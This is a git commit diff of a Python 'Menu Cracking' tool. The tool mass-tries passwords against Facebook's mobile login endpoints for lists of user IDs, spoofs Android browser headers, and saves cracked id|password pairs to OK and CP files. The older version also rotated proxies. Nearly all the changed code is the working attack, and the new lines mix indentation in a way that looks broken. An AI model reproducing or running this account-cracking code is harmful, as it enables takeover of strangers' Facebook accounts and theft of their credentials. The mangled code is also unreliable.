34d0b36a81b3fb554f49a077029b5f9177f737e4
rawagaming30099 <162732786+rawagaming30099@users.noreply.github.com>
2024-03-11 00:04:59 -0700

    Update DRAGON_VIP_FILE_CLONE.py

--- DRAGON_VIP_FILE_CLONE.py
+++ DRAGON_VIP_FILE_CLONE.py
@@ -156,21 +156,29 @@ def banner():
 
  
 
-██████   █████  ████████  █████  
-██   ██ ██   ██    ██    ██   ██ 
-██████  ███████    ██    ███████ 
-██   ██ ██   ██    ██    ██   ██ 
-██████  ██   ██    ██    ██   ██ 
+⠀⠛⠛⣿⣿⣿⣿⣿⡷⢶⣦⣶⣶⣤⣤⣤⣀⠀⠀⠀
+⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀
+⠀⠀⠀⠉⠉⠉⠙⠻⣿⣿⠿⠿⠛⠛⠛⠻⣿⣿⣇⠀
+⠀⠀⢤⣀⣀⣀⠀⠀⢸⣷⡄⠀⣁⣀⣤⣴⣿⣿⣿⣆
+⠀⠀⠀⠀⠹⠏⠀⠀⠀⣿⣧⠀⠹⣿⣿⣿⣿⣿⡿⣿
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠿⠇⢀⣼⣿⣿⠛⢯⡿⡟
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠦⠴⢿⢿⣿⡿⠷⠀⣿⠀
+⠀⠀⠀⠀⠀⠀⠀⠙⣷⣶⣶⣤⣤⣤⣤⣤⣶⣦⠃⠀
+⠀⠀⠀⠀⠀⠀⠀⢐⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣿⣿⣿⣿⠟⠁
+
                                  
                                  
 
 
 
                                                      
-\033[0;33m oooooooooooooooooooooooooooooooooooooooooooooooooooooooo                                                                                              
-\033[0;34m╔══\033[0;32m[•] OWNER         \033[0;34m╔══\033[0;32m[•] BATA
-\033[0;34m╠══\033[0;91m[•] CH            \033[0;34m╠══\033[0;91m[•] @i4m_bata
-\033[0;34m╚══\033[0;32m[•] BRO           \033[0;34m╚══\033[0;32m[•] RANDOM [BEST]""")
+\033[0;33m oooooooooooooooooooooooooooooooooooooooooooooooooooooooo 
+\033[0;34m╔══\033[0;32m[•] 𝐔𝐏𝐃𝐀𝐓𝐄 𝐁𝐘          \033[0;34m╔══\033[0;32m[•] @l4m_rawa
+\033[0;34m╔══\033[0;32m[•] OWNER         \033[0;34m╔══\033[0;32m[•] 𝐁𝐀𝐇𝐄𝐙🔥
+\033[0;34m╠══\033[0;91m[•] CH            \033[0;34m╠══\033[0;91m[•] @p0wer404
+\033[0;34m╚══\033[0;32m[•] BRO           \033[0;34m╚══\033[0;32m[•] 𝐁𝐀𝐇𝐄𝐙""")
 # LOGIN
 # new cooki 
 def login():
@@ -183,7 +191,7 @@ def login():
 	
 	print("")
 	print ('\033[1;33m~~~~~~~~~~Menu Cracking~~~~~~~~~~\033[0;97m')
-	print('\033[1;34m%s\033[1;36m[] %s%s%s \033[1;32m└\033[1;32m[1] [File Clone] %s%s%s'%(P,H,P,H,P,H,P))
+	print('\033[1;34m%s\033[1;36m[] %s%s%s \033[1;32m└\033[1;32m[1] [𝐂𝐑𝐀𝐂𝐊 𝐅𝐈𝐋𝐄] %s%s%s'%(P,H,P,H,P,H,P))
 	print('\033[1;34m%s\033[1;36m[] %s%s%s \033[1;35m└\033[1;32m[0] [Exit] %s%s%s'%(P,H,P,H,P,H,P))
 	print ('\033[1;33m~~~~~~~~~~Menu Cracking~~~~~~~~~~\033[0;97m')
 	dark = input('%s%s%s%s\033[1;36m└\033[1;32m[] [CHOOSE]%s\033[1;31m : '%(N,H,N,H,M))
@@ -776,34 +784,40 @@ def crack(idf,pwv):
 		try:
 			nip=random.choice(prox)
 			proxs= {'http': 'socks4://'+nip}
-			ses.headers.update({
-    'authority': 'mbasic.facebook.com',
+			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
+            p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
+            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
+            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
+            koki+=' m_pixel_ratio=2.625; wd=412x756'
+            heade = {'authority': 'm.facebook.com',
+    'method': 'GET',
+	'scheme': 'https',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9',
+    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
     'cache-control': 'max-age=0',
-    'referer': 'https://www.google.com/',
+    'content-type':'application/x-www-form-urlencoded',
+    'origin':'https://m.facebook.com',
+    'referer': 'https://m.facebook.com/',
+    'dpr': '2.75',
     'sec-ch-prefers-color-scheme': 'light',
-    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
-    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
+    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
     'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"Redmi Note 8 Pro"',
     'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"10.0.0"',
+    'sec-ch-ua-platform-version': '"11.0.0"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'cross-site',
+    'sec-fetch-site': 'same-origin',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
-})
-			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
-			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
-			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
-			koki+=' m_pixel_ratio=2.625; wd=412x756'
-			heade={"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
-			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
+    'user-agent': ua,
+    'viewport-width': '980',
+}
+            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				
-				print(f'\r\033[1;34m└[ BATAm709❌CP ] ID : {idf}  [+] PASSWORD : {pw}{N} ')       
+				print(f'\r\033[1;34m└[ 𝐁𝐀𝐇𝐄𝐙❌CP ] ID : {idf}  [+] PASSWORD : {pw}{N} ')       
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
@@ -812,7 +826,7 @@ def crack(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\033[1;32m└[ BATAm709✅OK ]\n \033[1;35mACCOUNT💚USER : {idf}   [+] ACCOUNT PASS💚 : {pw}      ')
+                                print(f'\r\033[1;32m└[ 𝐁𝐀𝐇𝐄𝐙✅OK ]\n \033[1;35mACCOUNT💚USER : {idf}   [+] ACCOUNT PASS💚 : {pw}      ')
 				#
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 				break
